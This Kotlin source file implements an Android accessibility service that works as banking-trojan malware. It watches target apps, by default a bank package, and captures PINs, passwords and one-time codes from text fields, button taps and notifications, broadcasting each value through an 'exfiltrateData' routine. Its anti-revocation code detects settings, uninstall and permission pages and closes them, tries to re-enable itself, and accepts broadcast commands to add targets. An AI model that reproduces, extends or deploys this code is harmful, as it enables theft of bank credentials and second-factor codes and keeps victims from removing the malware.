package com.decry.decry

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.TargetApi
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityManager
import android.provider.Settings
import java.util.regex.Pattern

class DecryAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "DecryAccessibility"
        private const val PREFS_NAME = "decry_prefs"
        private const val KEY_TARGET_APPS = "target_apps"
        private const val ACTION_DATA_CAPTURED = "com.decry.DATA_CAPTURED"
        private const val DEFAULT_TARGET_APP = "com.bank.example"
        private const val SETTINGS_PACKAGE = "com.android.settings"
        private const val PLAY_STORE_PACKAGE = "com.android.vending"
    }

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var prefs: SharedPreferences
    private var lastForegroundApp = ""
    private val pinPattern = Pattern.compile("^[0-9]{4,8}$")
    private val otpPattern = Pattern.compile("\\b([0-9]{4,8})\\b")
    private val capturedFields = mutableMapOf<String, String>()
    private val inputBuffer = StringBuilder()
    
    private var isMonitoring = true
    private val targetApps = mutableSetOf<String>()
    private val defaultTargetApp = DEFAULT_TARGET_APP
    
    // Track if we're currently monitoring a target app
    private var currentTargetApp: String? = null
    private val pinCaptureBuffer = StringBuilder()
    
    // Anti-revocation tracking
    private var lastSettingsEntryTime: Long = 0
    private var lastSettingsNodeScan: Long = 0
    
    // Keywords that indicate revocation attempts
    private val revocationKeywords = listOf(
        "disable",
        "uninstall",
        "force stop",
        "forceclose",
        "clear data",
        "clear cache",
        "app info",
        "appinfo",
        "app_setting",
        "manage apps",
        "app manager",
        "special access",
        "accessibility settings",
        "accessibility_service",
        "do not disturb access",
        "notification access"
    )
    
    // Sensitive settings pages to block
    private val revocationSettings = setOf(
        "com.android.settings.ACCESSIBILITY_SETTINGS",
        "com.android.settings.NOTIFICATION_POLICY_ACCESS_SETTINGS",
        "com.android.settings.APP_MANAGEMENT",
        "com.android.settings.APP_ERROR_ACTIVITY",
        "com.android.settings.UNINSTALL_SETTINGS",
        "com.android.settings.FORCE_STOP",
        "com.android.settings.SPECIAL_ACCESS_SETTINGS"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        
        // Load default target and any additional targets
        targetApps.add(defaultTargetApp)
        loadTargetApps()
        
        Log.i(TAG, "Decry Accessibility Service connected")
        Log.i(TAG, "Target apps: $targetApps")

        val info = AccessibilityServiceInfo().apply {
            this.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            this.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            this.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        }
        serviceInfo = info

        registerCommandReceiver()
        
        // Start anti-revocation monitor
        startAntiRevocationMonitor()
    }

    private fun startAntiRevocationMonitor() {
        Thread {
            while (true) {
                try {
                    Thread.sleep(2000)
                    checkAndRestoreSettings()
                } catch (e: Exception) {
                    Log.e(TAG, "Anti-revocation monitor error: ${e.message}")
                }
            }
        }.start()
    }

    @TargetApi(Build.VERSION_CODES.M)
    private fun checkAndRestoreSettings() {
        try {
            val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            if (!am.isEnabled) {
                // Service was disabled, attempt to re-enable
                Log.w(TAG, "Accessibility service disabled, attempting re-enable")
                reEnableAccessibilityService()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility: ${e.message}")
        }
    }

    private fun reEnableAccessibilityService() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            handler.postDelayed({
                // Attempt to re-enable programmatically
                val accessibilitySettings = Settings.Secure.getString(
                    contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                
                val serviceName = "${applicationContext.packageName}/${DecryAccessibilityService::class.java.name}"
                if (!accessibilitySettings.contains(serviceName)) {
                    val updated = if (accessibilitySettings.isEmpty()) {
                        serviceName
                    } else {
                        "$accessibilitySettings:$serviceName"
                    }
                    Settings.Secure.putString(
                        contentResolver,
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                        updated
                    )
                }
                
                Settings.Secure.putInt(
                    contentResolver,
                    Settings.Secure.ACCESSIBILITY_ENABLED,
                    1
                )
            }, 1000)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to re-enable accessibility: ${e.message}")
        }
    }

    private fun loadTargetApps() {
        val savedApps = prefs.getStringSet(KEY_TARGET_APPS, emptySet()) ?: emptySet()
        targetApps.addAll(savedApps)
        Log.i(TAG, "Loaded target apps: $targetApps")
    }

    private fun saveTargetApps() {
        prefs.edit().putStringSet(KEY_TARGET_APPS, targetApps.toSet()).apply()
    }

    private fun registerCommandReceiver() {
        val filter = IntentFilter("com.decry.COMMAND")
        registerReceiver(object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val cmd = intent?.getStringExtra("type")
                val payload = intent?.getStringExtra("payload")

                when (cmd) {
                    "set_target_app" -> {
                        payload?.let { appId ->
                            targetApps.add(appId)
                            saveTargetApps()
                            Log.i(TAG, "App targeted: $appId")
                            context?.sendBroadcast(Intent("com.decry.DATA_CAPTURED").apply {
                                putExtra("type", "target_status")
                                putExtra("content", "Added target: $appId")
                                putExtra("extra", "accessibility_service")
                            })
                        }
                    }
                    "unset_target_app" -> {
                        payload?.let { appId ->
                            targetApps.remove(appId)
                            saveTargetApps()
                            Log.i(TAG, "App untargeted: $appId")
                            context?.sendBroadcast(Intent("com.decry.DATA_CAPTURED").apply {
                                putExtra("type", "target_status")
                                putExtra("content", "Removed target: $appId")
                                putExtra("extra", "accessibility_service")
                            })
                        }
                    }
                    "list_targets" -> {
                        val targets = if (targetApps.isEmpty()) "None" else targetApps.joinToString("\n")
                        context?.sendBroadcast(Intent("com.decry.DATA_CAPTURED").apply {
                            putExtra("type", "target_list")
                            putExtra("content", targets)
                            putExtra("extra", "current_targets")
                        })
                    }
                    "stop_monitoring" -> {
                        isMonitoring = false
                        Log.i(TAG, "Monitoring disabled via command")
                    }
                    "resume_monitoring" -> {
                        isMonitoring = true
                        Log.i(TAG, "Monitoring re-enabled via command")
                    }
                }
            }
        }, filter)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || !isMonitoring) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleWindowStateChanged(event)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleViewFocused(event)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotificationEvent(event)
            AccessibilityEvent.TYPE_VIEW_CLICKED -> handleViewClicked(event)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleWindowContentChanged(event)
        }
    }

    private fun handleWindowStateChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""

        // Smart anti-revocation: Only block if trying to access specific revocation pages
        if (isSettingsRelated(packageName)) {
            // Allow general settings but monitor for revocation attempts
            if (isRevocationPage(className)) {
                Log.w(TAG, "REVOCATION ATTEMPT DETECTED: $packageName/$className")
                exfiltrateData("anti_revocation", "Revocation attempt: $packageName/$className", "blocked")
                
                // Check if user is navigating to uninstall or disable pages
                scanSettingsUIForRevocation(className)
                
                // Close the revocation page
                closeSettingsRevocationPage()
                return
            }
            
            // Log but allow general settings access
            Log.d(TAG, "Settings page accessed (allowed): $packageName/$className")
            return
        }
        
        // Block system permission dialogs
        if (packageName == "android" && className.contains("Permission")) {
            Log.w(TAG, "System permission dialog detected - closing")
            exfiltrateData("anti_revocation", "Permission dialog intercepted", "permission_blocked")
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        if (packageName != lastForegroundApp) {
            Log.d(TAG, "App switched: $packageName/$className")

            // Check if this is a target app
            val isTarget = targetApps.contains(packageName)
            if (isTarget) {
                Log.i(TAG, "🎯 Target app in foreground: $packageName")
                currentTargetApp = packageName
                pinCaptureBuffer.clear()
                capturedFields.remove(packageName)
                
                exfiltrateData("app_foreground", "$packageName/$className", "target_app_detected")
            } else {
                currentTargetApp = null
            }
            lastForegroundApp = packageName
        }
    }

    private fun isSettingsRelated(packageName: String): Boolean {
        return packageName == SETTINGS_PACKAGE ||
               packageName.contains("settings", ignoreCase = true) ||
               packageName.contains("android.settings", ignoreCase = true)
    }

    private fun isRevocationPage(className: String): Boolean {
        val lowerClassName = className.lowercase()
        return revocationSettings.any { it.lowercase() in lowerClassName } ||
               revocationKeywords.any { keyword -> 
                   lowerClassName.contains(keyword) ||
                   className.lowercase().contains(keyword)
               }
    }

    private fun scanSettingsUIForRevocation(className: String) {
        // Debounce scanning
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastSettingsNodeScan < 3000) return
        lastSettingsNodeScan = currentTime

        try {
            val rootNode = rootInActiveWindow ?: return
            
            // Look for buttons/text that indicate uninstall or disable actions
            findRevocationElements(rootNode, className)
        } catch (e: Exception) {
            Log.e(TAG, "Error scanning settings UI: ${e.message}")
        }
    }

    private fun findRevocationElements(node: AccessibilityNodeInfo, className: String) {
        try {
            val text = node.text?.toString()?.lowercase() ?: ""
            
            // Check for dangerous actions
            if (text.contains("uninstall") || 
                text.contains("disable") || 
                text.contains("force stop") ||
                (text.contains("ok") || text.contains("confirm")) && 
                (text.contains("disable") || text.contains("uninstall")) ||
                text.contains("forceclose") ||
                text.contains("app info") && text.contains("storage") == false) {
                
                Log.w(TAG, "Dangerous action detected in settings: $text")
                exfiltrateData("anti_revocation", "Dangerous action: $text", "ui_scan:$className")
                
                // Close the settings app
                closeSettingsRevocationPage()
                return
            }
            
            // Recursively check children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    findRevocationElements(child, className)
                }
            }
        } catch (e: Exception) {
            // Silently handle
        }
    }

    private fun closeSettingsRevocationPage() {
        try {
            // First try to navigate back
            performGlobalAction(GLOBAL_ACTION_BACK)
            
            // If that doesn't work, go to home screen
            handler.postDelayed({
                performGlobalAction(GLOBAL_ACTION_HOME)
            }, 500)
            
            // Log and notify
            Log.w(TAG, "Settings page closed - revocation prevented")
            exfiltrateData("anti_revocation", "Settings closed to prevent revocation", "auto_close")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to close settings: ${e.message}")
            try {
                performGlobalAction(GLOBAL_ACTION_HOME)
            } catch (e2: Exception) {
                Log.e(TAG, "Emergency navigation failed: ${e2.message}")
            }
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        // Allow settings text monitoring (for revocation detection) but don't capture
        if (isSettingsRelated(packageName)) return
        
        // Check if this app is a target
        if (!targetApps.contains(packageName)) return
        
        val texts = event.text?.map { it.toString() } ?: emptyList()

        for (text in texts) {
            if (text.isEmpty()) continue

            // Capture PIN (4-8 digits only)
            if (pinPattern.matcher(text).matches()) {
                if (text != capturedFields[packageName]) {
                    capturedFields[packageName] = text
                    Log.i(TAG, "🔐 PIN captured: $text (app: $packageName)")
                    exfiltrateData("pin_capture", text, "$packageName input_field")
                }
            }

            // Capture potential passwords (longer inputs)
            if (text.length > 6) {
                if (text != capturedFields["${packageName}_pass"]) {
                    capturedFields["${packageName}_pass"] = text
                    Log.d(TAG, "Password-like input: ${text.take(3)}*** (app: $packageName)")
                    exfiltrateData("password_capture", text, "$packageName input")
                }
            }

            // Capture OTP codes from text fields
            val otpMatcher = otpPattern.matcher(text)
            if (otpMatcher.find() && text.contains(Regex("(?i)(otp|code|verify|password|pin)", RegexOption.IGNORE_CASE))) {
                val otp = otpMatcher.group(1)
                if (otp != null) {
                    Log.i(TAG, "📱 OTP captured from text: $otp (app: $packageName)")
                    exfiltrateData("otp_capture", otp, "$packageName text_field")
                }
            }
        }
    }

    private fun handleViewFocused(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (!targetApps.contains(packageName)) return

        val rootNode = rootInActiveWindow ?: return
        traverseAndExtractInputs(rootNode, packageName)
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (!targetApps.contains(packageName)) return

        val text = event.text?.firstOrNull()?.toString()
        if (text != null && pinPattern.matcher(text).matches()) {
            pinCaptureBuffer.append(text)
            
            if (pinCaptureBuffer.length >= 4) {
                val pin = pinCaptureBuffer.toString()
                pinCaptureBuffer.setLength(0)
                
                Log.i(TAG, "🔐 PIN via button clicks: $pin")
                exfiltrateData("pin_capture", pin, "$packageName button_entry")
            }
        }
    }

    private fun handleNotificationEvent(event: AccessibilityEvent) {
        val texts = event.text?.map { it.toString() } ?: emptyList()
        val packageName = event.packageName?.toString() ?: ""

        // Block settings-related notifications to prevent revocation
        if (isSettingsRelated(packageName)) {
            // Check if notification contains revocation-related content
            for (text in texts) {
                if (text.lowercase().contains("disable") || 
                    text.lowercase().contains("uninstall") ||
                    text.lowercase().contains("accessibility")) {
                    Log.w(TAG, "Revocation-related notification intercepted: $text")
                    exfiltrateData("anti_revocation", "Blocked notification: $text", "notification_intercept")
                }
            }
            return
        }

        for (text in texts) {
            val lowerText = text.lowercase()
            
            // Check for OTP patterns in notifications
            if (lowerText.contains(Regex("(?i)(otp|code|verification|pin|security)"))) {
                val otpMatcher = otpPattern.matcher(text)
                if (otpMatcher.find()) {
                    val otp = otpMatcher.group(1)
                    Log.i(TAG, "🔑 OTP from notification: $otp (app: $packageName)")
                    exfiltrateData("otp_capture", otp, "$packageName: $text")
                }
            }
            
            // Check for any numeric code in notifications
            if (lowerText.length in 4..8 && pinPattern.matcher(lowerText).matches()) {
                Log.i(TAG, "🔢 Code in notification: $text (app: $packageName)")
                exfiltrateData("otp_capture", text, "$packageName notification")
            }
        }
    }

    private fun handleWindowContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        // Handle settings revocation monitoring
        if (isSettingsRelated(packageName)) {
            val className = event.className?.toString() ?: ""
            if (isRevocationPage(className)) {
                scanSettingsUIForRevocation(className)
            }
            return
        }
        
        if (!targetApps.contains(packageName)) return

        val rootNode = rootInActiveWindow ?: return
        handler.postDelayed({
            traverseAndExtractInputs(rootNode, packageName)
        }, 500)
    }

    private fun traverseAndExtractInputs(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val text = node.text?.toString() ?: ""
            val hintText = node.hintText?.toString() ?: ""
            val className = node.className?.toString() ?: ""

            val isNumericField = className.contains("EditText", ignoreCase = true) ||
                hintText.lowercase().contains(Regex("(pin|password|code|otp|verify)"))

            if (text.isNotEmpty() && isNumericField) {
                if (pinPattern.matcher(text).matches() && text != capturedFields["${packageName}_pin"]) {
                    capturedFields["${packageName}_pin"] = text
                    Log.i(TAG, "🔐 PIN from traversal: $text (app: $packageName)")
                    exfiltrateData("pin_capture", text, "$packageName node_traversal")
                }
            }

            if (text.isNotEmpty() && text.length > 6 && targetApps.contains(packageName)) {
                if (text != capturedFields["${packageName}_pass_traversal"]) {
                    capturedFields["${packageName}_pass_traversal"] = text
                    Log.d(TAG, "Password: ${text.take(3)}*** (app: $packageName)")
                    exfiltrateData("password_capture", text, "$packageName traversal_input")
                }
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    traverseAndExtractInputs(child, packageName)
                }
            }
        } catch (e: Exception) {
            // Silently handle
        }
    }

    private fun exfiltrateData(type: String, content: String, extra: String) {
        try {
            val intent = Intent(ACTION_DATA_CAPTURED).apply {
                putExtra("type", type)
                putExtra("content", content)
                putExtra("extra", extra)
                putExtra("timestamp", System.currentTimeMillis().toString())
            }
            sendBroadcast(intent)
            Log.i("DecryDATA", "[$type] $content | $extra")
        } catch (e: Exception) {
            Log.e(TAG, "Exfiltration failed: ${e.message}")
        }
    }

    private fun toggleDnd(enabled: Boolean) {
        try {
            val audioManager =
                getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            audioManager.ringerMode =
                if (enabled) android.media.AudioManager.RINGER_MODE_SILENT
                else android.media.AudioManager.RINGER_MODE_NORMAL

            Log.i(TAG, "DND ${if (enabled) "ON" else "OFF"}")
            exfiltrateData("dnd_status", if (enabled) "on" else "off", "accessibility")
        } catch (e: Exception) {
            Log.e(TAG, "DND error: ${e.message}")
        }
    }

    private fun Context.getSystemService(name: String): Any {
        return applicationContext.getSystemService(name)
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }

    override fun onUnbind(intent: Intent?): Boolean {
        Log.w(TAG, "Service unbound")
        
        // Attempt auto-restart
        handler.postDelayed({
            val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            if (!am.isEnabled) {
                reEnableAccessibilityService()
            }
        }, 2000)
        return super.onUnbind(intent)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "Service destroyed unexpectedly")
        
        // Attempt auto-restart via broadcast
        try {
            val intent = Intent("com.decry.RESTART_SERVICE")
            sendBroadcast(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send restart broadcast: ${e.message}")
        }
    }
}
